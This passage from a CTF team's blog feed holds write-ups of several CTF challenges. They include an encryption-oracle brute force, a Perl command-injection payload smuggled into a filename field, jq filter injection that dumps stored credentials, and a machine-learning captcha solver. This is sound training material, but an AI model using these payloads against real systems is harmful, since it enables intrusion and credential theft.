style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But if you think I am going to reverse the algorithm, you are wrong. I&#39;m just using the binary as an encryption oracle.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;(plaintext, mode):
  context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;plaintext&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(plaintext)
  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; process([&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenge/scss&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;plaintext&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ciphertext&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;encrypt&amp;#39;&lt;/span&gt;, mode])
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;wait_for_close()
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
  &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ciphertext&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ciphertext

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;recover&lt;/span&gt;(target_ciphertext, mode):
  message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(target_ciphertext)):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;):
      plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; message &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; bytes([j])
      ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; encrypt(plaintext, mode)
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; target_ciphertext&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;startswith(ciphertext):
        message &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plaintext
        &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(i, message)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; message

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
  &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;challenge/flag_encrypted&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; f:
    target_ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; f&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()

  &lt;span style=&#34;color:#75715e&#34;&gt;# print(recover(target_ciphertext, &amp;#39;ecb&amp;#39;))&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# print(recover(target_ciphertext, &amp;#39;cbc&amp;#39;))&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# print(recover(target_ciphertext, &amp;#39;cfb&amp;#39;))&lt;/span&gt;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(recover(target_ciphertext, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ofb&amp;#39;&lt;/span&gt;))
  &lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;3k{my_hands_are_registered_as_lethal_weapons_that_means_we_get_into_a_fight_i_accidentally_kill_you_i_go_to_jail}&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;flood-misc-495-points&#34;&gt;flood (Misc; 495 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;We have a service running remotely. The source code, &lt;code&gt;service.pl&lt;/code&gt;, is given to us. Perl sadness&lt;sup class=&#34;footnote-ref&#34; id=&#34;fnref:perl&#34;&gt;&lt;a class=&#34;footnote&#34; href=&#34;#fn:perl&#34;&gt;2&lt;/a&gt;&lt;/sup&gt; strikes back...&lt;/p&gt;

&lt;p&gt;Obviously, we can actually earn more gold by &lt;em&gt;selling gold&lt;/em&gt;. From the source code:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;? how much gold u wanna spend\n&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;! 1 GOLD = 1000 POINTS\n&amp;gt; &amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;my&lt;/span&gt; $subm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;lt;STDIN&amp;gt;&lt;/span&gt;;
chomp $subm;
&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;( ($subm) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; $gold  &lt;span style=&#34;color:#f92672&#34;&gt;and&lt;/span&gt; int($subm)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
  $gold   &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; ($subm);
  $points &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; ($subm)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Why? We can set &lt;code&gt;$subm = -0.9999&lt;/code&gt;... In this case we can generate as much gold as we want.&lt;/p&gt;

&lt;p&gt;Another vulnerability comes from theh following line that runs during &lt;em&gt;load game&lt;/em&gt;. This API opens if you are rich enough -- well, we are.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-perl&#34; data-lang=&#34;perl&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# $name is what we can control. However, `.`, `/` and ` ` are forbidden.&lt;/span&gt;
open (SAVEGAME, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/app/files/&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$name) &lt;span style=&#34;color:#f92672&#34;&gt;or&lt;/span&gt; break;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;How? For example, if &lt;code&gt;$name = &amp;quot;||ls|&amp;quot;;&lt;/code&gt; it executes &lt;code&gt;ls&lt;/code&gt; from shell. But what if we want to execute &lt;code&gt;ls /&lt;/code&gt; given that  and &lt;code&gt;/&lt;/code&gt; are forbidden? In short, we can use &lt;code&gt;\t&lt;/code&gt; (&amp;lt;TAB&amp;gt;) in place of the  (&amp;lt;SPACE&amp;gt;), and &lt;code&gt;$(expr\tsubstr\t$PWD\t1\t1)&lt;/code&gt; in place of &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Hence, we can send use &lt;code&gt;||ls\t&amp;quot;$(expr\tsubstr\t$PWD\t1\t1)&amp;quot;\t-al|&lt;/code&gt; as our name and the directory can be listed. The following line is curious...&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;-rw-r--r--   1 root root    30 Jul 23 14:26 fcad0373020fa6ede979389f558b396f4cd38ec1_README&amp;#39;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;We can use &lt;code&gt;cat /fcad0373020fa6ede979389f558b396f4cd38ec1_README&lt;/code&gt; (with the above substitution) as our name. Finally the flag is there: &lt;code&gt;3k{p333rl_aInt_7hat_deAd_Y3t}&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;libcdb-misc-494-points&#34;&gt;libcDB (Misc; 494 points)&lt;/h2&gt;

&lt;p&gt;We are given a libc database search (which looks useful and we should definitely have one ourselves!). Playing with the API we have met the following error:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; .search fprintf 0x4b970 ..
jq: error: Invalid numeric literal at EOF at line 1, column 3 (while parsing &amp;#39;...&amp;#39;) at &amp;lt;top-level&amp;gt;, line 1:
. as $maindb | .libcDB[] | select(.symbol==&amp;#34;fprintf&amp;#34;) | select(.address|contains(&amp;#34;309616&amp;#34;)) | ...                                                                                              
jq: 1 compile error&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If we have to make an educated guess on the actual query, it would be:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;jq &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;. as $maindb | .libcDB[] | select(.symbol==&amp;#34;[SYMBOL]&amp;#34;) \
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;   | select(.address|contains(&amp;#34;[ADDR]&amp;#34;)) | .[FILTER]&amp;#39;&lt;/span&gt; test.json&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Read along the documentation of &lt;code&gt;jq&lt;/code&gt;, we have experimented around:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; .search fprintf 0 |$maindb|keys|{id:.[]}
Found:
	id		libcDB
Found:
	id		users&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;gt; .search fprintf 0 |$maindb.users[]|keys|{id:.[]}
Found:
	id		password
Found:
	id		username&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;&amp;gt; .search fprintf 0 |$maindb.users[]|{id:.username,symbol:.password}
Found:
	id		3k
	symbol		notaflag
Found:
	id		James
	symbol		Hetfield
Found:
	id		Lars
	symbol		Ulrich
Found:
	id		Dead
	symbol		pool
Found:
	id		admin
	symbol		v3ryL0ngPwC4nTgu3SS0xfff
Found:
	id		jim
	symbol		carrey&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Okay. Great, we have the credentials of the admin. Connecting to the service again, and this time we are signing in with it.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc libcdb.3k.ctf.to 7777
Login    &amp;gt; admin
Password &amp;gt; v3ryL0ngPwC4nTgu3SS0xfff
Authenticated {&amp;#34;users&amp;#34;:{&amp;#34;username&amp;#34;:&amp;#34;admin&amp;#34;,&amp;#34;password&amp;#34;:&amp;#34;v3ryL0ngPwC4nTgu3SS0xfff&amp;#34;}}
                            
 __    _ _       ____  _____ 
|  |  |_| |_ ___|    \| __  |
|  |__| | . |  _|  |  | __ -|
|_____|_|___|___|____/|_____|
                         as a service

Type .help for help

&amp;gt; .secret
3k{jq_is_r3ally_HelpFULL_3af4bcd97f5}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;footnotes&#34;&gt;

&lt;hr&gt;

&lt;ol&gt;
&lt;li id=&#34;fn:dns-rebind&#34;&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/DNS_rebinding&#34;&gt;DNS rebinding from Wikipedia&lt;/a&gt;
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:dns-rebind&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li id=&#34;fn:perl&#34;&gt;&lt;a href=&#34;https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf&#34;&gt;The Perm Jam 2: The Camel Strikes Back - @na7irub&lt;/a&gt;
 &lt;a class=&#34;footnote-return&#34; href=&#34;#fnref:perl&#34;&gt;&lt;sup&gt;[return]&lt;/sup&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>UIUCTF 2020: Bot Protection IV</title>
      <link>https://b6a.black/posts/2020-07-22-uiuctf-bot-protection-iv/</link>
      <pubDate>Wed, 22 Jul 2020 18:55:00 +0800</pubDate>
      
      <guid>https://b6a.black/posts/2020-07-22-uiuctf-bot-protection-iv/</guid>
      <description>&lt;style&gt;
@font-face {
    font-family: &#39;minecraft-enchantment&#39;;
    src: url(&#39;/images/2020-07-22-uiuctf-bot-protection-iv/minecraft-enchantment.ttf&#39;);
}
&lt;/style&gt;

&lt;p&gt;&lt;font style=&#34;font-family: minecraft-enchantment;&#34;&gt;&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/chall.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;In this challenge, we have a website with captcha. Base on the question, we need to solve 500 captcha within 10 minutes. Very easy right?&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/mainpage.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;However, the language of this captcha is the &lt;a href=&#34;https://minecraft.gamepedia.com/Enchanting_Table#Standard_Galactic_Alphabet&#34;&gt;Standard Galactic Alphabet&lt;/a&gt; (Minecraft enchantment glyphs).&lt;/p&gt;

&lt;p&gt;The character mapping:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/charset.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;From the source code, there is a curious comment:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!--TODO: we don&amp;#39;t need /captchas.zip anymore now that we dynamically create captchas. We should delete this file.--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We are able to obtain ~70k samples &lt;a href=&#34;https://captcha.chal.uiuc.tf/captchas.zip&#34;&gt;here&lt;/a&gt; provided by the challenge author.&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/unzip.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;This is one of the sample captchas:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/UZNXF_54629.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;With this dataset, I think everyone can think of using neural network to solve this challenge (I guess MNIST or captcha solving should be the first example you run in deep learning course, right?)&lt;/p&gt;

&lt;p&gt;From my experience, I know that it may not a good idea for me to debug/tune a neural network for doing computer vision work during a CTF. After some trial and error, I come across with this excellent github repo &lt;a href=&#34;https://github.com/nickliqian/cnn_captcha&#34;&gt;cnn_captcha&lt;/a&gt;. I also received a interactive script from my god like teammate @mystiz613.&lt;/p&gt;

&lt;p&gt;In order to use this code, you need to setup the config file (&lt;code&gt;conf/sample_config.json&lt;/code&gt;) properly. This is my configuration:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;{
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;origin_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xxx/solve/captchas/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;new_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xxx/solve/new_train/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;train_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xxx/solve/train/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;test_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/home/xxx/solve/test/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;api_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sample/api/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;online_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sample/online/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;local_image_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sample/local/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;model_save_dir&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;model_v8/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;image_width&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;250&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;image_height&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;max_captcha&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;image_suffix&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;png&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;char_set&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;use_labels_json_file&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;remote_url&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://127.0.0.1:6100/captcha/&amp;#34;&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;cycle_stop&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;20000&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;acc_stop&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.99&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;cycle_save&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;enable_gpu&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;train_batch_size&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;,
  &lt;span style=&#34;color:#f92672&#34;&gt;&amp;#34;test_batch_size&amp;#34;&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;first-attempt&#34;&gt;First attempt&lt;/h2&gt;

&lt;p&gt;With one &lt;em&gt;GeForce RTX 2080&lt;/em&gt;, I can train up a model with 99% accuracy within 1.5 hours. Here I didn&#39;t do a proper separate of train and test sets, but turns out this model saved me a lot later...&lt;/p&gt;

&lt;p&gt;This model mostly end up in level 30 to 40 and start to fail. Anyway, it is normal. With a 99% accuracy, we only have 0.6570% to survive up to lv 500 🙁&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/model1.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;h2 id=&#34;second-attempt&#34;&gt;Second attempt&lt;/h2&gt;

&lt;p&gt;Here, I think of &lt;a href=&#34;https://en.wikipedia.org/wiki/Ensemble_learning&#34;&gt;Ensemble Learning&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/ensemble_learning.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;The idea of ensemble learning is very simple. Assume we trained multiple classifer for the same classification problem, we create a classification base on multiple classifier to our input. We apply a similar concept here, but we hope any one of them could solve the captcha even the previous model fails to do. Originally, we think of bruteforce the top 2 decision of each character, but turns out it requires 32 query, which we may run out of time...&lt;/p&gt;

&lt;p&gt;To train up different models, I tried to play with the different parameters like batch size, size of evaluation set and different training set, etc.&lt;/p&gt;

&lt;p&gt;I also collected extra dataset by save those captcha we solved with only 1 model and denote as good set, those with more than 2 models as benign set. We feed these data to our training script to train new model and deploy it to collect more new samples. In total, we collected 120k samples and trained 8 models through this iterating process.&lt;/p&gt;

&lt;p&gt;The strategy for adding new samples to the dataset as follows, we tried to extend our dataset upto about 90k with both good set and benign set. And the last 20k is from the benign set. We also trained several models with different numbers of data samples during our data collection procedures.&lt;/p&gt;

&lt;p&gt;The best result with five models is 169 levels, while I can attain reach level 225 with eight models. For 5 models to 8 models ensemble, we improve from solving 40 level before fail to average solving 60 level. However, it still very far away from solving 500 within 10 minutes.&lt;/p&gt;

&lt;p&gt;At the end, my god like teammate @mystiz613 come up with an idea to solve as a hybird approach (DL model + human)... That is, if a captcha can&#39;t be solve with 8 of my models, I will do it myself...&lt;/p&gt;

&lt;p&gt;After 3 trials (once timeout at 495 lv, once at 365 lv), we succesfully capture the flag with ~90 second left by luck (manually solved ~10 times in total)...&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/solved.jpg&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;Level &lt;span style=&#34;color:#ae81ff&#34;&gt;497&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; high enough
Invalid captcha
Invalid captcha
Invalid captcha
Invalid captcha
Invalid captcha
Level &lt;span style=&#34;color:#ae81ff&#34;&gt;498&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; high enough
Level &lt;span style=&#34;color:#ae81ff&#34;&gt;499&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; high enough
uiuctf{i_knew_a_guy_in_highschool_that_could_read_this}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;credits&#34;&gt;Credits&lt;/h2&gt;

&lt;p&gt;90% of work from @mystiz613, 10% from me.&lt;/p&gt;

&lt;h2 id=&#34;reflection&#34;&gt;Reflection&lt;/h2&gt;

&lt;p&gt;I guess there are better way to solve it with full automation right? After submitted the flag, I tried to do cause analysis why is such hard to solve with full automation (I know that I am too weak, please don&#39;t laugh at me 😭). These are my observations:&lt;/p&gt;

&lt;h3 id=&#34;duplicate-characters&#34;&gt;Duplicate characters&lt;/h3&gt;

&lt;p&gt;Continuous duplicate character is hard to solve with my model.&lt;/p&gt;

&lt;p&gt;JGGSS:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/JGGSS.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;YJKYY:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/YJKYY.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;h3 id=&#34;j-r-p-and-y&#34;&gt;J, R, P and Y&lt;/h3&gt;

&lt;p&gt;Due to similar shape to other characters or is formed by more than 2 components...&lt;/p&gt;

&lt;p&gt;YJKYY:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/YJKYY.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;JPSCB:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/JPSCB.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;FDSEJ:&lt;/p&gt;

&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://b6a.black/images/2020-07-22-uiuctf-bot-protection-iv/FDSEJ.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;VJGJJ:&lt;/p&gt;

